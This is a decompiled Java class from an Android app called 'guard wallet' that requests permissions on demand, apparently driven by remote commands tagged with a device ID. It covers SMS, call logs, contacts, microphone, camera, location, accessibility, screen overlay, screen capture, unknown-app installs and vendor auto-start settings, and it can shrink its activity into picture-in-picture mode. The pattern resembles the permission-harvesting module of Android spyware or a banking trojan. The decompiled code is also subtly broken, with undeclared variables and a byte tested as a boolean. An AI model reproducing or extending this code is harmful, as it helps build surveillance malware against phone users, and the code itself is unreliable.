package e;

import a1.q;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.AppOpsManager;
import android.app.PictureInPictureParams;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.PictureInPictureParams.Builder;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Rect;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Process;
import android.os.Build.VERSION;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.util.Rational;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.PermissionRequestVO;
import com.guard.wallet.req.PermissionResponseVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.e;
import com.guard.wallet.utils.g;
import com.guard.wallet.utils.h;
import com.guard.wallet.utils.j;
import java.lang.ref.WeakReference;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.atomic.AtomicBoolean;

public final class b {
   public static volatile b a;
   public static volatile WeakReference b;
   public static final AtomicBoolean c = new AtomicBoolean(false);
   public static final ScheduledExecutorService d = Executors.newSingleThreadScheduledExecutor();

   public static Activity a() {
      Activity var0;
      if (b == null) {
         var0 = null;
      } else {
         var0 = (Activity)b.get();
      }

      return var0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void b(Activity var0) {
      synchronized (b.class){} // $VF: monitorenter 

      Throwable var10000;
      label382: {
         label383: {
            label384: {
               label385: {
                  label373:
                  try {
                     if (b != null && b.get() != null) {
                        break label373;
                     }
                     break label385;
                  } catch (Throwable var57) {
                     var10000 = var57;
                     boolean var10001 = false;
                     break label382;
                  }

                  try {
                     if (Objects.equals(var0, b.get())) {
                        break label383;
                     }

                     WeakReference var60 = new WeakReference<>(var0);
                     b = var60;
                     break label384;
                  } catch (Throwable var56) {
                     var10000 = var56;
                     boolean var62 = false;
                     break label382;
                  }
               }

               try {
                  WeakReference var1 = new WeakReference<>(var0);
                  b = var1;
               } catch (Throwable var55) {
                  var10000 = var55;
                  boolean var61 = false;
                  break label382;
               }
            }

            try {
               h.I();
            } catch (Throwable var54) {
               var10000 = var54;
               boolean var63 = false;
               break label382;
            }
         }

         try {
            if (a == null) {
               b var58 = new b();
               a = var58;
            }
         } catch (Throwable var53) {
            var10000 = var53;
            boolean var64 = false;
            break label382;
         }

         label354:
         try {
            // $VF: monitorexit
            return;
         } catch (Throwable var52) {
            var10000 = var52;
            boolean var65 = false;
            break label354;
         }
      }

      while (true) {
         Throwable var59 = var10000;

         try {
            // $VF: monitorexit
            throw var59;
         } catch (Throwable var51) {
            var10000 = var51;
            boolean var66 = false;
            continue;
         }
      }
   }

   public static boolean c() {
      boolean var0;
      if (b != null && b.get() != null && c.get()) {
         var0 = true;
      } else {
         var0 = false;
      }

      return var0;
   }

   public static void d() {
      if (b != null && b.get() != null) {
         AtomicBoolean var0 = c;
         if (var0.get()) {
            ((Activity)b.get()).finishAndRemoveTask();
            var0.set(false);
         }
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void e() {
      Exception var10000;
      label38: {
         int var0;
         Builder var7;
         try {
            var0 = VERSION.SDK_INT;
            if (b == null || b.get() == null) {
               return;
            }

            Rational var1 = new Rational(50, 20);
            Builder var2 = new Builder();
            var2 = var2.setAspectRatio(var1);
            Rect var6 = new Rect(0, 0, 50, 20);
            var7 = var2.setSourceRectHint(var6);
         } catch (Exception var5) {
            var10000 = var5;
            boolean var10001 = false;
            break label38;
         }

         if (var0 >= 31) {
            try {
               j.c(j.a(var7));
            } catch (Exception var4) {
               var10000 = var4;
               boolean var11 = false;
               break label38;
            }
         }

         try {
            PictureInPictureParams var9 = var7.build();
            if (((Activity)b.get()).enterPictureInPictureMode(var9)) {
               c.set(true);
            }

            return;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var12 = false;
         }
      }

      Exception var8 = var10000;
      q.s("AbsMainActivity", var8);
   }

   public static PermissionResponseVO f(PermissionRequestVO var0) {
      PermissionResponseVO var12 = new PermissionResponseVO();
      var12.setDeviceId(h.l("deviceId"));
      int var3 = 0;
      boolean var4 = false;
      int var2 = 0;
      int var1 = 0;
      Integer var11 = 0;
      var12.setRequested(var11);
      var12.setGranted(var11);
      if (a() != null && var0 != null && var0.getRequestCode() != null && var0.getRequestCode() > 0) {
         if (!q.B(var0.getGroupValue())) {
            String var49 = var0.getGroupValue();
            var2 = var0.getRequestCode();
            PermissionResponseVO var18 = new PermissionResponseVO();
            var18.setDeviceId(h.l("deviceId"));
            var18.setRequested(var11);
            var18.setGranted(var11);
            if (a() != null && !q.B(var49)) {
               label314: {
                  var49.getClass();
                  switch (var49.hashCode()) {
                     case -1639857183:
                        if (var49.equals("android.permission-group.CONTACTS")) {
                           break label314;
                        }
                        break;
                     case -1410061184:
                        if (var49.equals("android.permission-group.PHONE")) {
                           var1 = 1;
                           break label314;
                        }
                        break;
                     case -1250730292:
                        if (var49.equals("android.permission-group.CALENDAR")) {
                           var1 = 2;
                           break label314;
                        }
                        break;
                     case -1243751087:
                        if (var49.equals("android.permission-group.CALL_LOG")) {
                           var1 = 3;
                           break label314;
                        }
                        break;
                     case -1140935117:
                        if (var49.equals("android.permission-group.CAMERA")) {
                           var1 = 4;
                           break label314;
                        }
                        break;
                     case -746978218:
                        if (var49.equals("android.permission-group.READ_MEDIA_VISUAL")) {
                           var1 = 5;
                           break label314;
                        }
                        break;
                     case -43134093:
                        if (var49.equals("android.permission-group.READ_MEDIA_AURAL")) {
                           var1 = 6;
                           break label314;
                        }
                        break;
                     case 225035509:
                        if (var49.equals("android.permission-group.ACTIVITY_RECOGNITION")) {
                           var1 = 7;
                           break label314;
                        }
                        break;
                     case 421761675:
                        if (var49.equals("android.permission-group.SENSORS")) {
                           var1 = 8;
                           break label314;
                        }
                        break;
                     case 828638019:
                        if (var49.equals("android.permission-group.LOCATION")) {
                           var1 = 9;
                           break label314;
                        }
                        break;
                     case 852078861:
                        if (var49.equals("android.permission-group.STORAGE")) {
                           var1 = 10;
                           break label314;
                        }
                        break;
                     case 1485193722:
                        if (var49.equals("android.permission-group.NOTIFICATIONS")) {
                           var1 = 11;
                           break label314;
                        }
                        break;
                     case 1581272376:
                        if (var49.equals("android.permission-group.MICROPHONE")) {
                           var1 = 12;
                           break label314;
                        }
                        break;
                     case 1720655883:
                        if (var49.equals("android.permission-group.NEARBY_DEVICES")) {
                           var1 = 13;
                           break label314;
                        }
                        break;
                     case 1795181803:
                        if (var49.equals("android.permission-group.SMS")) {
                           var1 = 14;
                           break label314;
                        }
                  }

                  var1 = -1;
               }

               label420: {
                  switch (var1) {
                     case 0:
                        var1 = ContextCompat.checkSelfPermission(a(), "android.permission.WRITE_CONTACTS");
                        if (ContextCompat.checkSelfPermission(a(), "android.permission.READ_CONTACTS") == 0 && var1 == 0) {
                           break label420;
                        }

                        ActivityCompat.requestPermissions(a(), new String[]{"android.permission.WRITE_CONTACTS", "android.permission.READ_CONTACTS"}, var2);
                        break;
                     case 1:
                        var3 = ContextCompat.checkSelfPermission(a(), "android.permission.CALL_PHONE");
                        var1 = ContextCompat.checkSelfPermission(a(), "android.permission.READ_PHONE_STATE");
                        if (var3 == 0 && var1 == 0) {
                           break label420;
                        }

                        ActivityCompat.requestPermissions(a(), new String[]{"android.permission.CALL_PHONE", "android.permission.READ_PHONE_STATE"}, var2);
                        break;
                     case 2:
                        var1 = ContextCompat.checkSelfPermission(a(), "android.permission.WRITE_CALENDAR");
                        if (ContextCompat.checkSelfPermission(a(), "android.permission.READ_CALENDAR") == 0 && var1 == 0) {
                           break label420;
                        }

                        ActivityCompat.requestPermissions(a(), new String[]{"android.permission.WRITE_CALENDAR", "android.permission.READ_CALENDAR"}, var2);
                        break;
                     case 3:
                        var3 = ContextCompat.checkSelfPermission(a(), "android.permission.READ_CALL_LOG");
                        var1 = ContextCompat.checkSelfPermission(a(), "android.permission.WRITE_CALL_LOG");
                        if (var3 == 0 && var1 == 0) {
                           break label420;
                        }

                        ActivityCompat.requestPermissions(a(), new String[]{"android.permission.READ_CALL_LOG", "android.permission.WRITE_CALL_LOG"}, var2);
                        break;
                     case 4:
                        if (ContextCompat.checkSelfPermission(a(), "android.permission.CAMERA") == 0) {
                           break label420;
                        }

                        ActivityCompat.requestPermissions(a(), new String[]{"android.permission.CAMERA"}, var2);
                        break;
                     case 5:
                        if (VERSION.SDK_INT < 33) {
                           return var18;
                        }

                        var1 = ContextCompat.checkSelfPermission(a(), "android.permission.READ_MEDIA_IMAGES");
                        var3 = ContextCompat.checkSelfPermission(a(), "android.permission.READ_MEDIA_VIDEO");
                        if (var1 == 0 && var3 == 0) {
                           break label420;
                        }

                        ActivityCompat.requestPermissions(
                           a(), new String[]{"android.permission.READ_MEDIA_IMAGES", "android.permission.READ_MEDIA_VIDEO"}, var2
                        );
                        break;
                     case 6:
                        if (VERSION.SDK_INT < 33) {
                           return var18;
                        }

                        if (ContextCompat.checkSelfPermission(a(), "android.permission.READ_MEDIA_AUDIO") == 0) {
                           break label420;
                        }

                        ActivityCompat.requestPermissions(a(), new String[]{"android.permission.READ_MEDIA_AUDIO"}, var2);
                        break;
                     case 7:
                        if (VERSION.SDK_INT < 29) {
                           return var18;
                        }

                        if (ContextCompat.checkSelfPermission(a(), "android.permission.ACTIVITY_RECOGNITION") == 0) {
                           break label420;
                        }

                        ActivityCompat.requestPermissions(a(), new String[]{"android.permission.ACTIVITY_RECOGNITION"}, var2);
                        break;
                     case 8:
                        if (ContextCompat.checkSelfPermission(a(), "android.permission.BODY_SENSORS") == 0) {
                           break label420;
                        }

                        ActivityCompat.requestPermissions(a(), new String[]{"android.permission.BODY_SENSORS"}, var2);
                        break;
                     case 9:
                        var1 = ContextCompat.checkSelfPermission(a(), "android.permission.ACCESS_FINE_LOCATION");
                        var3 = ContextCompat.checkSelfPermission(a(), "android.permission.ACCESS_COARSE_LOCATION");
                        if (var1 == 0 && var3 == 0) {
                           break label420;
                        }

                        ActivityCompat.requestPermissions(
                           a(), new String[]{"android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_COARSE_LOCATION"}, var2
                        );
                        break;
                     case 10:
                        var1 = ContextCompat.checkSelfPermission(a(), "android.permission.WRITE_EXTERNAL_STORAGE");
                        var3 = ContextCompat.checkSelfPermission(a(), "android.permission.READ_EXTERNAL_STORAGE");
                        if (var1 == 0 && var3 == 0) {
                           break label420;
                        }

                        ActivityCompat.requestPermissions(
                           a(), new String[]{"android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE"}, var2
                        );
                        break;
                     case 11:
                        if (VERSION.SDK_INT < 33) {
                           return var18;
                        }

                        if (ContextCompat.checkSelfPermission(a(), "android.permission.POST_NOTIFICATIONS") == 0) {
                           break label420;
                        }

                        ActivityCompat.requestPermissions(a(), new String[]{"android.permission.POST_NOTIFICATIONS"}, var2);
                        break;
                     case 12:
                        if (ContextCompat.checkSelfPermission(a(), "android.permission.RECORD_AUDIO") == 0) {
                           break label420;
                        }

                        ActivityCompat.requestPermissions(a(), new String[]{"android.permission.RECORD_AUDIO"}, var2);
                        break;
                     case 13:
                        if (VERSION.SDK_INT < 33) {
                           return var18;
                        }

                        if (ContextCompat.checkSelfPermission(a(), "android.permission.NEARBY_WIFI_DEVICES") == 0) {
                           break label420;
                        }

                        ActivityCompat.requestPermissions(a(), new String[]{"android.permission.NEARBY_WIFI_DEVICES"}, var2);
                        break;
                     case 14:
                        var1 = ContextCompat.checkSelfPermission(a(), "android.permission.RECEIVE_SMS");
                        var3 = ContextCompat.checkSelfPermission(a(), "android.permission.READ_SMS");
                        if (var1 == 0 && var3 == 0) {
                           break label420;
                        }

                        ActivityCompat.requestPermissions(a(), new String[]{"android.permission.RECEIVE_SMS", "android.permission.READ_SMS"}, var2);
                        break;
                     default:
                        return var18;
                  }

                  var18.setRequested(1);
                  var18.setGranted(var11);
                  return var18;
               }

               var18.setRequested(var11);
               var18.setGranted(1);
            }

            return var18;
         }

         if (!q.B(var0.getPermissionValue())) {
            label388: {
               var12.setRequestCode(var0.getRequestCode());
               String var5 = var0.getPermissionValue();
               var5.getClass();
               switch (var5.hashCode()) {
                  case -1855887118:
                     if (var5.equals("android.permission.AUTO_START")) {
                        var19 = 0;
                        break label388;
                     }
                     break;
                  case -1106439520:
                     if (var5.equals("android.permission.USAGE_ACCESS_SETTINGS")) {
                        var19 = 1;
                        break label388;
                     }
                     break;
                  case -431919634:
                     if (var5.equals("android.permission.ACCESSIBILITY")) {
                        var19 = 2;
                        break label388;
                     }
                     break;
                  case -160041744:
                     if (var5.equals("android.permission.OVERLAY")) {
                        var19 = 3;
                        break label388;
                     }
                     break;
                  case 92962859:
                     if (var5.equals("android.permission.MANAGE_UNKNOWN_APP_SOURCES")) {
                        var19 = 4;
                        break label388;
                     }
                     break;
                  case 1174723143:
                     if (var5.equals("android.permission.IGNORE_BATTERY_OPTIMIZATIONS")) {
                        var19 = 5;
                        break label388;
                     }
                     break;
                  case 1523123434:
                     if (var5.equals("android.permission.MEDIA_PROJECTION")) {
                        var19 = 6;
                        break label388;
                     }
               }

               var19 = -1;
            }

            label376: {
               Intent var43;
               label421: {
                  label374: {
                     Object var6 = null;
                     Object var10 = null;
                     StringBuilder var7;
                     switch (var19) {
                        case 0:
                           byte var23 = (byte)var2;
                           if (a() != null) {
                              if (ContextCompat.checkSelfPermission(a(), "android.permission.RECEIVE_BOOT_COMPLETED") == 0 && !e.g()) {
                                 h.i("has_receive_completed");
                                 h.j("last_req_start_timestamp");
                                 System.currentTimeMillis();
                              }

                              label361: {
                                 var52 = a();
                                 String var14 = Build.MANUFACTURER;
                                 var43 = new Intent();
                                 var43.addFlags(268435456);
                                 String var15 = var14.toLowerCase();
                                 var15.getClass();
                                 switch (var15.hashCode()) {
                                    case -1320380160:
                                       if (var15.equals("oneplus")) {
                                          var23 = 0;
                                          break label361;
                                       }
                                       break;
                                    case -1206476313:
                                       if (var15.equals("huawei")) {
                                          var23 = 1;
                                          break label361;
                                       }
                                       break;
                                    case -759499589:
                                       if (var15.equals("xiaomi")) {
                                          var23 = 2;
                                          break label361;
                                       }
                                       break;
                                    case -719460456:
                                       if (var15.equals("yulong")) {
                                          var23 = 3;
                                          break label361;
                                       }
                                       break;
                                    case 50733:
                                       if (var15.equals("360")) {
                                          var23 = 4;
                                          break label361;
                                       }
                                       break;
                                    case 3242770:
                                       if (var15.equals("itel")) {
                                          var23 = 5;
                                          break label361;
                                       }
                                       break;
                                    case 3318203:
                                       if (var15.equals("letv")) {
                                          var23 = 6;
                                          break label361;
                                       }
                                       break;
                                    case 3418016:
                                       if (var15.equals("oppo")) {
                                          var23 = 7;
                                          break label361;
                                       }
                                       break;
                                    case 3620012:
                                       if (var15.equals("vivo")) {
                                          var23 = 8;
                                          break label361;
                                       }
                                       break;
                                    case 99462250:
                                       if (var15.equals("honor")) {
                                          var23 = 9;
                                          break label361;
                                       }
                                       break;
                                    case 103777484:
                                       if (var15.equals("meizu")) {
                                          var23 = 10;
                                          break label361;
                                       }
                                       break;
                                    case 110235987:
                                       if (var15.equals("tecno")) {
                                          var23 = 11;
                                          break label361;
                                       }
                                       break;
                                    case 1864941562:
                                       if (var15.equals("samsung")) {
                                          var23 = 12;
                                          break label361;
                                       }
                                       break;
                                    case 1945248885:
                                       if (var15.equals("infinix")) {
                                          var23 = 13;
                                          break label361;
                                       }
                                 }

                                 var23 = -1;
                              }

                              label342: {
                                 switch (var23) {
                                    case 0:
                                       var16 = new ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity");
                                       break label342;
                                    case 1:
                                    case 9:
                                       Log.d("自启动管理 >>>>", "getAutostartSettingIntent: 华为");
                                       var16 = new ComponentName(
                                          "com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
                                       );
                                       break label342;
                                    case 2:
                                       var16 = new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity");
                                       break label342;
                                    case 3:
                                    case 4:
                                       var16 = new ComponentName(
                                          "com.yulong.android.coolsafe", "com.yulong.android.coolsafe.ui.activity.autorun.AutoRunListActivity"
                                       );
                                       break label342;
                                    case 5:
                                    case 11:
                                    case 13:
                                       var16 = new ComponentName("com.transsion.phonemaster", "com.cyin.himgr.autostart.AutoStartActivity");
                                       break label342;
                                    case 6:
                                       var43.setAction("com.letv.android.permissionautoboot");
                                       break;
                                    case 7:
                                       var16 = new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity");
                                       break label342;
                                    case 8:
                                       var16 = new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.PurviewTabActivity");
                                       break label342;
                                    case 10:
                                       var16 = new ComponentName("com.meizu.safe", "com.meizu.safe.permission.SmartBGActivity");
                                       break label342;
                                    case 12:
                                       var16 = new ComponentName("com.samsung.android.sm", "com.samsung.android.sm.app.dashboard.SmartManagerDashBoardActivity");
                                       break label342;
                                    default:
                                       new Intent("android.settings.APPLICATION_DETAILS_SETTINGS")
                                          .setData(Uri.fromParts("package", var52.getPackageName(), null));
                                       var43 = new Intent("android.settings.SETTINGS");
                                 }

                                 var16 = null;
                              }

                              var43.setComponent(var16);
                              List var53 = var52.getPackageManager().queryIntentActivities(var43, 65536);
                              Intent var17 = (Intent)var6;
                              if (var53 != null) {
                                 var17 = (Intent)var6;
                                 if (var53.size() > 0) {
                                    var17 = var43;
                                 }
                              }

                              var23 = (byte)var2;
                              if (var17 != null) {
                                 if (a() != null) {
                                    a().startActivity(var17);
                                 }

                                 h.D(System.currentTimeMillis(), "last_req_start_timestamp");
                                 var23 = 1;
                              }
                           }

                           if (var23) {
                              break label376;
                           }
                           break label374;
                        case 1:
                           Activity var47 = a();
                           boolean var22 = var4;
                           if (((AppOpsManager)var47.getSystemService("appops"))
                                 .checkOpNoThrow("android:get_usage_stats", Process.myUid(), var47.getPackageName())
                              == 0) {
                              var22 = true;
                           }

                           if (!var22) {
                              var43 = new Intent("android.settings.USAGE_ACCESS_SETTINGS");
                              break label421;
                           }
                           break label374;
                        case 2:
                           Activity var45 = a();
                           String var13 = MyAccessibilityService.class.getName();
                           List var46 = ((ActivityManager)var45.getSystemService("activity")).getRunningServices(100);
                           boolean var21;
                           if (var46.isEmpty()) {
                              var21 = (boolean)var3;
                           } else {
                              var2 = 0;

                              while (true) {
                                 var21 = (boolean)var3;
                                 if (var2 >= var46.size()) {
                                    break;
                                 }

                                 if (((RunningServiceInfo)var46.get(var2)).service.getClassName().equals(var13)) {
                                    var21 = true;
                                    break;
                                 }

                                 var2++;
                              }
                           }

                           if (!var21) {
                              g.V0();
                              break label376;
                           }
                           break label374;
                        case 3:
                           if (Settings.canDrawOverlays(a())) {
                              break label374;
                           }

                           var43 = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION");
                           var7 = new StringBuilder("package:");
                           var6 = MainApplication.getAppContext().getPackageName();
                           break;
                        case 4:
                           if (!a().getPackageManager().canRequestPackageInstalls()) {
                              StringBuilder var44 = new StringBuilder("package:");
                              var44.append(a().getPackageName());
                              g(new Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES", Uri.parse(var44.toString())), var0.getRequestCode());
                              break label376;
                           }
                           break label374;
                        case 5:
                           if (g.o0()) {
                              break label374;
                           }

                           Intent var8 = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                           StringBuilder var9 = new StringBuilder("package:");
                           var43 = var8;
                           var7 = var9;
                           var6 = var10;
                           if (a() != null) {
                              var6 = a().getPackageName();
                              var43 = var8;
                              var7 = var9;
                           }
                           break;
                        case 6:
                           MediaProjectionManager var42 = (MediaProjectionManager)a().getSystemService("media_projection");
                           if (var42 == null) {
                              return var12;
                           }

                           var43 = var42.createScreenCaptureIntent();
                           break label421;
                        default:
                           if (ContextCompat.checkSelfPermission(a(), var0.getPermissionValue()) != 0) {
                              Activity var41 = a();
                              var6 = var0.getPermissionValue();
                              var1 = var0.getRequestCode();
                              ActivityCompat.requestPermissions(var41, new String[]{(String)var6}, var1);
                              break label376;
                           }
                           break label374;
                     }

                     var7.append((String)var6);
                     var43.setData(Uri.parse(var7.toString()));
                     break label421;
                  }

                  var12.setRequested(var11);
                  var12.setGranted(1);
                  return var12;
               }

               g(var43, var0.getRequestCode());
            }

            var12.setRequested(1);
            var12.setGranted(var11);
         }
      }

      return var12;
   }

   public static void g(Intent var0, int var1) {
      if (a() != null) {
         try {
            a().startActivityForResult(var0, var1);
         } catch (Exception var2) {
            q.s("AbsMainActivity", var2);
         }
      }
   }
}
